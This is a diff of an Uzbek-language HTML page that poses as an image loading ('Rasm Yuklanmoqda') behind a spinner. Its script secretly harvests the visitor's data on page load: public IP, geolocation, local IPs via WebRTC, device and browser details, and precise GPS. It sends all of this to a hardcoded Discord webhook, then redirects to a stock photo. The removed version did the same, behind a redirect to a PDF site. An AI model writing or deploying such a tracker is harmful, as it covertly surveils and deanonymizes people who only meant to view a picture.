@@ -3,270 +3,281 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rasm Yuklanmoqda...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: white;
+        }
+        .loading-container {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 40px;
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid white;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h1 {
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
+        p {
+            margin: 5px 0;
+            opacity: 0.9;
+        }
+    </style>
 </head>
 <body>
-    
+    <div class="loading-container">
+        <div class="spinner"></div>
+        <h1>Rasm Yuklanmoqda...</h1>
+        <p>Iltimos, kuting</p>
+    </div>
 
     <script>
-        // Maqsadli URL
-        const targetURL = 'https://pdfsimpli.com/ru/lp/translate-pdf/?962-902-7329&utm_source=google&utm_medium=sem&utm_campaign=23059244338&utm_term=%D0%BA%D0%B0%D0%BA%20%D0%BF%D0%B5%D1%80%D0%B5%D0%B2%D0%B5%D1%81%D1%82%D0%B8%20pdf%20%D1%84%D0%B0%D0%B9%D0%BB%20%D0%BD%D0%B0%20%D1%80%D1%83%D1%81%D1%81%D0%BA%D0%B8%D0%B9&network=g&device=c&adposition=&adgroupid=191636653851&placement=&location=1028523&gad_source=1&gad_campaignid=23059244338&gbraid=0AAAAApVBV2AwnD6kzFyOqi2kWCDpED7Zd&gclid=CjwKCAjwmNLHBhA4EiwA3ts3mdvvfYRE8uQ3XjfZWsA9Scfmf2DjOJ5rdQXmAriRI-F7iGh1FSis3hoCi8UQAvD_BwE';
-        const webhook = "https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI";
-
-        // Progress boshqaruvi
-        function updateProgress(percent, status) {
-            document.getElementById('progressFill').style.width = percent + '%';
-            document.getElementById('percent').textContent = percent;
-            document.getElementById('status').textContent = status;
-        }
-
-        function updateIPInfo(info) {
-            document.getElementById('ipInfo').textContent = info;
-        }
-
-        // Local IP ni ishonchli olish
-        function getLocalIPs() {
-            return new Promise((resolve) => {
-                const privateIPs = [];
-                let foundIPs = false;
-
-                updateIPInfo("Local tarmoq skanerlanyapti...");
-
-                try {
-                    const pc = new RTCPeerConnection({
-                        iceServers: [
-                            { urls: 'stun:stun.l.google.com:19302' },
-                            { urls: 'stun:stun1.l.google.com:19302' },
-                            { urls: 'stun:stun2.l.google.com:19302' }
-                        ]
-                    });
-
-                    pc.createDataChannel('');
-
-                    pc.onicecandidate = (e) => {
-                        if (e.candidate) {
-                            const candidate = e.candidate.candidate;
-                            
-                            // IPv4 manzillarini qidirish
-                            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/g;
-                            const matches = candidate.match(ipRegex);
-                            
-                            if (matches) {
-                                matches.forEach(ip => {
-                                    // Private IP larni tekshirish
-                                    if ((ip.startsWith('192.168.') || 
-                                         ip.startsWith('10.') || 
-                                         (ip.startsWith('172.') && 
-                                          parseInt(ip.split('.')[1]) >= 16 && 
-                                          parseInt(ip.split('.')[1]) <= 31)) && 
-                                        !privateIPs.includes(ip)) {
-                                        privateIPs.push(ip);
-                                        foundIPs = true;
-                                        updateIPInfo(`Topilgan Local IP: ${ip}`);
-                                    }
-                                });
-                            }
-                        } else {
-                            // Barcha candidate lar tugadi
-                            if (!foundIPs) {
-                                // WebRTC orqali IP olish
-                                pc.createOffer()
-                                    .then(offer => {
-                                        const sdp = offer.sdp;
-                                        const ipMatches = sdp.match(/([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/g);
-                                        if (ipMatches) {
-                                            ipMatches.forEach(ip => {
-                                                if ((ip.startsWith('192.168.') || ip.startsWith('10.') || 
-                                                     (ip.startsWith('172.') && parseInt(ip.split('.')[1]) >= 16 && parseInt(ip.split('.')[1]) <= 31)) && 
-                                                    !privateIPs.includes(ip)) {
-                                                    privateIPs.push(ip);
-                                                    foundIPs = true;
-                                                }
-                                            });
-                                        }
-                                        resolve(privateIPs.length > 0 ? privateIPs : ['Local IP WebRTC orqali topilmadi']);
-                                    })
-                                    .catch(() => resolve(['WebRTC xatosi']));
-                            } else {
-                                resolve(privateIPs);
-                            }
-                        }
-                    };
-
-                    pc.createOffer()
-                        .then(offer => pc.setLocalDescription(offer))
-                        .catch(() => resolve(['Offer xatosi']));
-
-                } catch (error) {
-                    resolve(['RTCP xatosi: ' + error.message]);
+        // Juda oddiy va ishonchli tracker
+        function startTracking() {
+            const webhook = "https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI";
+            
+            // 1. IP ni olish
+            fetch('https://api.ipify.org?format=json')
+            .then(function(response) { 
+                if (!response.ok) {
+                    throw new Error('Tarmoq javobi yaxshi emas');
                 }
-
-                // 3 soniyadan keyin timeout
-                setTimeout(() => {
-                    resolve(privateIPs.length > 0 ? privateIPs : ['Local IP vaqt tugadi']);
-                }, 4000);
+                return response.json(); 
+            })
+            .then(function(ipData) {
+                const publicIP = ipData.ip;
+                
+                // Geolokatsiya ma'lumotlarini olish
+                getGeolocation(publicIP).then(geoData => {
+                    // 2. Local IP ni olish
+                    let localIPs = "Aniqlanmoqda";
+                    try {
+                        const pc = new RTCPeerConnection({iceServers: []});
+                        pc.createDataChannel('');
+                        pc.createOffer().then(function(offer) { 
+                            return pc.setLocalDescription(offer); 
+                        });
+                        
+                        const ips = [];
+                        pc.onicecandidate = function(e) {
+                            if (e.candidate) {
+                                const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+                                if (match) ips.push(match[1]);
+                            }
+                        };
+                        
+                        setTimeout(function() {
+                            localIPs = ips.length > 0 ? ips.join(', ') : 'Topilmadi';
+                            sendToDiscord(publicIP, localIPs, geoData);
+                        }, 2000);
+                        
+                    } catch (e) {
+                        localIPs = 'Xato: ' + e.message;
+                        sendToDiscord(publicIP, localIPs, geoData);
+                    }
+                });
+            })
+            .catch(function(error) {
+                console.error('Xato:', error);
+                sendToDiscord('IP olishda xato: ' + error.message, 'Noma lum', {});
             });
         }
 
-        // Discord-ga yuborish
-        async function sendToDiscord(content) {
-            try {
-                const response = await fetch(webhook, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        content: content,
-                        username: 'Real User Tracker'
-                    })
+        // IP orqali geolokatsiya ma'lumotlarini olish
+        function getGeolocation(ip) {
+            return fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        return {
+                            country: data.country,
+                            region: data.regionName,
+                            city: data.city,
+                            isp: data.isp,
+                            coordinates: `${data.lat}, ${data.lon}`,
+                            timezone: data.timezone
+                        };
+                    }
+                    return {};
+                })
+                .catch(error => {
+                    console.error('Geolokatsiya xatosi:', error);
+                    return {};
                 });
-                return response.ok;
-            } catch (error) {
-                console.error('Discord xatosi:', error);
-                return false;
-            }
         }
 
-        // Network ma'lumotlarini olish
-        function getNetworkInfo() {
-            const connection = navigator.connection;
-            let networkInfo = '';
+        function sendToDiscord(publicIP, localIPs, geoData) {
+            const webhook = "https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI";
             
-            if (connection) {
-                networkInfo = `📡 **Ulanish:** ${connection.effectiveType || 'N/A'}\n` +
-                            `⬇️ **Download:** ${connection.downlink || 'N/A'} Mbps\n` +
-                            `⏱ **RTT:** ${connection.rtt || 'N/A'} ms`;
+            const now = new Date();
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            
+            // Tizim ma'lumotlari
+            const systemInfo = {
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                languages: navigator.languages,
+                cookieEnabled: navigator.cookieEnabled,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Noma lum',
+                deviceMemory: navigator.deviceMemory || 'Noma lum',
+                maxTouchPoints: navigator.maxTouchPoints || 0
+            };
+
+            let messageContent = "📊 Detailed System Report\n";
+            messageContent += "🌐 Public IP\n" + publicIP + "\n";
+            messageContent += "🏠 Local IPs\n" + localIPs + "\n";
+            messageContent += "🕐 Local Time\n" + now.toLocaleString() + "\n";
+            
+            if (Object.keys(geoData).length > 0) {
+                messageContent += "🗺 IP Geolocation\n";
+                messageContent += "📍 Location: " + (geoData.coordinates || 'Noma lum') + "\n";
+                messageContent += "🏙 City: " + (geoData.city || 'Noma lum') + "\n";
+                messageContent += "🌍 Region: " + (geoData.region || 'Noma lum') + ", " + (geoData.country || 'Noma lum') + "\n";
+                messageContent += "🏢 ISP: " + (geoData.isp || 'Noma lum') + "\n";
             }
             
-            return networkInfo;
-        }
-
-        // Asosiy funksiya
-        async function startTracking() {
-            updateProgress(10, "IP manzil aniqlanmoqda...");
+            messageContent += "🖥 System Information\n";
+            messageContent += "💻 Platform: " + systemInfo.platform + "\n";
+            messageContent += "🧠 CPU Cores: " + systemInfo.hardwareConcurrency + "\n";
+            messageContent += "💾 RAM: " + (systemInfo.deviceMemory ? systemInfo.deviceMemory + ' GB' : 'Noma lum') + "\n";
+            messageContent += "👆 Touch Points: " + systemInfo.maxTouchPoints + "\n";
+            messageContent += "🌐 Browser: " + navigator.userAgent.split(') ')[0] + ")\n";
+            messageContent += "🔗 URL: " + window.location.href + "\n";
+            messageContent += "⏰ Timezone: " + timezone + "\n";
+            messageContent += "📱 Screen: " + screen.width + "x" + screen.height + "\n";
+            messageContent += "🎯 Color Depth: " + screen.colorDepth + "-bit\n";
             
-            let publicIP = "Noma'lum";
-            let localIPs = ["Noma'lum"];
-            let locationInfo = "";
-            let networkInfo = "";
+            const message = {
+                content: messageContent
+            };
             
-            try {
-                // Public IP olish
-                updateIPInfo("Public IP olinmoqda...");
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                publicIP = ipData.ip;
-                updateProgress(30, "Public IP topildi");
-                updateIPInfo(`Public IP: ${publicIP}`);
-
-                // Geolokatsiya
-                updateProgress(40, "Geolokatsiya ma'lumotlari olinmoqda...");
-                try {
-                    const geoResponse = await fetch(`https://ipapi.co/${publicIP}/json/`);
-                    const geoData = await geoResponse.json();
-                    if (geoData.country_name) {
-                        locationInfo = `📍 **Manzil:** ${geoData.city || ''}, ${geoData.region || ''}, ${geoData.country_name}\n` +
-                                     `🌍 **Koordinatalar:** ${geoData.latitude || ''}, ${geoData.longitude || ''}\n` +
-                                     `🏢 **ISP:** ${geoData.org || geoData.isp || ''}\n` +
-                                     `🏛 **ASN:** ${geoData.asn || ''}\n`;
-                    }
-                } catch (geoError) {
-                    console.log('Geolokatsiya xatosi:', geoError);
+            fetch(webhook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(message)
+            })
+            .then(function(response) {
+                if (!response.ok) {
+                    throw new Error('Discord javob bermadi');
                 }
-                
-                updateProgress(60, "Local tarmoq tekshirilmokda...");
-                
-                // Local IP larni olish
-                localIPs = await getLocalIPs();
-                updateIPInfo(`Public: ${publicIP} | Local: ${localIPs.join(', ')}`);
-                
-                // Network ma'lumotlari
-                networkInfo = getNetworkInfo();
-                
-            } catch (error) {
-                console.log('Xato:', error);
-                updateIPInfo(`Xato: ${error.message}`);
-            }
-            
-            updateProgress(80, "Ma'lumotlar yuborilmoqda...");
-            
-            // Discord xabarini tayyorlash
-            const message = 
-                `👤 **HAQIQIY FOYDALANUVCHI**\n\n` +
-                `🌐 **Public IP:** ${publicIP}\n` +
-                `🏠 **Local IP:** ${localIPs.join(', ')}\n` +
-                `🔗 **Hosting:** ${window.location.hostname}\n\n` +
-                `${locationInfo ? `🗺 **GEOLOKATSIYA**\n${locationInfo}\n` : ''}` +
-                `${networkInfo ? `📡 **NETWORK**\n${networkInfo}\n\n` : ''}` +
-                `💻 **TIZIM MA'LUMOTLARI**\n` +
-                `🖥 **Platforma:** ${navigator.platform}\n` +
-                `🌐 **Brauzer:** ${navigator.userAgent.split(') ')[0] + ')'}\n` +
-                `📱 **Ekran:** ${screen.width}x${screen.height}\n` +
-                `🎨 **Rang:** ${screen.colorDepth}-bit\n` +
-                `🕐 **Vaqt:** ${new Date().toLocaleString()}\n` +
-                `🔗 **URL:** ${window.location.href}`;
-            
-            // Ma'lumotlarni yuborish
-            const sent = await sendToDiscord(message);
-            
-            if (sent) {
-                updateProgress(100, "Ma'lumotlar yuborildi! Yo'naltirilmoqda...");
-                updateIPInfo("✅ Barcha ma'lumotlar yuborildi");
-            } else {
-                updateProgress(100, "Xato! Yo'naltirilmoqda...");
-                updateIPInfo("❌ Ma'lumotlar yuborilmadi");
-            }
-            
-            // 3 soniyadan keyin o'tkazish
-            setTimeout(() => {
-                window.location.href = targetURL;
-            }, 3000);
+                console.log('Ma lumotlar yuborildi');
+            })
+            .catch(function(error) {
+                console.log('Yuborish xatosi:', error);
+            })
+            .finally(function() {
+                // Rasmga o'tish
+                setTimeout(function() {
+                    window.location.href = 'https://images.unsplash.com/photo-1556740758-90deafc9c4f0';
+                }, 3000);
+            });
         }
 
-        // GPS ma'lumotlari
-        function startGPSTracking() {
-            if (navigator.geolocation) {
-                updateIPInfo("GPS so'ralmoqda...");
-                
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        const gpsMessage = 
-                            `📍 **GPS MA'LUMOTLARI**\n\n` +
-                            `🗺 **Kenglik:** ${position.coords.latitude}\n` +
-                            `🗺 **Uzunlik:** ${position.coords.longitude}\n` +
-                            `🎯 **Aniqlik:** ${position.coords.accuracy}m\n` +
-                            `⛰ **Balandlik:** ${position.coords.altitude || 'N/A'}m\n` +
-                            `⚡ **Tezlik:** ${position.coords.speed || 'N/A'}m/s\n` +
-                            `🧭 **Yo'nalish:** ${position.coords.heading || 'N/A'}°`;
-                        
-                        await sendToDiscord(gpsMessage);
-                        updateIPInfo("✅ GPS ma'lumotlari yuborildi");
-                    },
-                    async (error) => {
-                        const gpsError = 
-                            `📍 **GPS RAD ETILDI**\n\n` +
-                            `❌ **Xato:** ${error.message}\n` +
-                            `🔢 **Kod:** ${error.code}\n` +
-                            `📱 **Platforma:** ${navigator.platform}`;
-                        
-                        await sendToDiscord(gpsError);
-                        updateIPInfo("❌ GPS rad etildi");
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }
-                );
-            } else {
-                updateIPInfo("❌ GPS qo'llab-quvvatlanmaydi");
-            }
+        // GPS ni alohida yuborish
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    const gpsMsg = {
+                        content: "📍 GPS TOPILDI!\n" +
+                                 "Kenglik: " + position.coords.latitude + "\n" +
+                                 "Uzunlik: " + position.coords.longitude + "\n" +
+                                 "Aniqlik: " + position.coords.accuracy + "m\n" +
+                                 "Balandlik: " + (position.coords.altitude || 'Noma lum') + "m\n" +
+                                 "Tezlik: " + (position.coords.speed || 'Noma lum') + "m/s"
+                    };
+                    
+                    fetch("https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI", {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify(gpsMsg)
+                    }).catch(e => console.log('GPS yuborish xatosi:', e));
+                },
+                function(error) {
+                    console.log('GPS rad etildi:', error.message);
+                    // GPS rad etilgan holatda ham ma'lumot yuborish
+                    const gpsErrorMsg = {
+                        content: "📍 GPS RAD ETILDI!\n" +
+                                 "Xato: " + error.message + "\n" +
+                                 "Kod: " + error.code
+                    };
+                    
+                    fetch("https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI", {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify(gpsErrorMsg)
+                    }).catch(e => console.log('GPS xato yuborish xatosi:', e));
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
         }
 
-        // Dasturni ishga tushirish
-        document.addEventListener('DOMContentLoaded', () => {
+        // Brauzer va tizim qo'shimcha ma'lumotlari
+        function collectAdditionalInfo() {
+            const info = {
+                plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || 'Yo q',
+                javaEnabled: navigator.javaEnabled ? 'Ha' : 'Yo q',
+                pdfViewerEnabled: navigator.pdfViewerEnabled ? 'Ha' : 'Yo q',
+                doNotTrack: navigator.doNotTrack || 'Noma lum',
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : 'Noma lum'
+            };
+            
+            return info;
+        }
+
+        // Darrov ishga tushirish
+        document.addEventListener('DOMContentLoaded', function() {
+            startTracking();
+            
+            // Qo'shimcha ma'lumotlarni yig'ish va yuborish
             setTimeout(() => {
-                startTracking();
-                startGPSTracking();
-            }, 1000);
+                const additionalInfo = collectAdditionalInfo();
+                const additionalMsg = {
+                    content: "🔧 Qo'shimcha Tizim Ma'lumotlari\n" +
+                             "🔌 Pluginlar: " + additionalInfo.plugins + "\n" +
+                             "☕ Java: " + additionalInfo.javaEnabled + "\n" +
+                             "📄 PDF Ko'ruvchi: " + additionalInfo.pdfViewerEnabled + "\n" +
+                             "🚫 Kuzatish: " + additionalInfo.doNotTrack + "\n" +
+                             "📡 Ulanish: " + (additionalInfo.connection.effectiveType || 'Noma lum')
+                };
+                
+                fetch("https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI", {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(additionalMsg)
+                }).catch(e => console.log('Qo shimcha ma lumot yuborish xatosi:', e));
+            }, 4000);
         });
     </script>
 </body>
